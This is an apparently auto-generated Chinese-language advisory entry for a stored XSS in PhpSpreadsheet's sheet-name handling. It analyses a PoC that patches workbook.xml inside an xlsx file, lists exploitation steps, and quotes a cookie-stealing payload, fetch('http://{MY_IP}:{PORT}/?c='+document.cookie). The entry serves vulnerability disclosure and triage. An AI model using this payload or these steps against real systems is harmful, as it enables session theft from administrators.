## CVE-2024-45427 - PhpSpreadsheet XSS (Stored Cross-Site Scripting)

**漏洞编号:** CVE-2024-45427

**漏洞类型:** XSS (Stored Cross-Site Scripting)

**影响应用:** PhpSpreadsheet

**危害等级:** High

**CVSS评分:** 7.5 (Estimated)

**影响版本:** Up to v3.7.0

**利用条件:** 攻击者需上传特制的恶意Excel文件且系统未对Sheet名称进行二次过滤

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

【POC有效性分析】该POC针对PhpSpreadsheet库在处理Excel文件中的Sheet名称时存在的验证缺陷进行了针对性构造。通过分析exploit3.py脚本，可以看出攻击者采取了非传统的利用方式：首先利用标准库openpyxl创建一个合规的xlsx模板，随后通过zipfile模块以二进制流的方式直接修改xl/workbook.xml。这种做法极其巧妙，因为它完全绕过了应用层库在生成文件时的合法性校验，直接将XML实体编码后的恶意JavaScript脚本注入到底层XML结构的'name'属性中。当受影响的PhpSpreadsheet版本解析此类被篡改的XML并将其渲染为HTML（例如在预览或管理后台显示工作表名称）时，如果缺乏适当的转义输出，该Payload就会在管理员浏览器上下文中执行。POC代码逻辑闭环，利用步骤清晰，针对性强，具有极高的实际利用价值。【利用步骤】1. 配置攻击者监听环境：攻击者首先修改脚本中的MY_IP和PORT，指向其控制的远程服务器。2. 构造恶意文件：运行exploit3.py，脚本会自动完成从模板创建、解压、XML底层替换到重新打包的过程，生成assignment_exploit.xlsx。3. 触发漏洞：攻击者将此文件上传至目标业务系统（如作业提交系统、报表管理系统等）。4. 窃取数据：一旦具备权限的用户在后台查看或处理此文件，浏览器会执行fetch操作，将包含敏感信息的document.cookie发送至攻击者监听的HTTP服务器。【投毒风险分析】从提供的Python源代码来看，其投毒风险处于极低水平。首先，代码逻辑完全透明，使用了Python标准的zipfile、shutil和os库，不存在任何加密混淆（Obfuscation）或远程字节码下载行为。其次，脚本的核心意图明确指向安全研究：它通过字符串替换（.replace）展示漏洞成因，而非隐藏恶意意图。Payload部分 `fetch('http://{MY_IP}:{PORT}/?c='+document.cookie)` 是典型的安全研究中用于证明XSS影响的无害化回传脚本。代码中不包含恶意删除、自我复制或向不受控的第三方IP发送数据的行为。然而，虽然脚本本身无害，但此类通过修改XML底层绕过逻辑的思路可能会被恶意攻击者整合进自动化攻击工具中。对于防御方而言，应重点检查PhpSpreadsheet的升级版本，并加强对解析后内容的输出转义。

**项目地址:** [https://github.com/vulnwatchdog/CVE-2024-45427](https://www.google.com/search?q=https://github.com/vulnwatchdog/CVE-2024-45427)

**漏洞详情:** [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45427](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-45427)
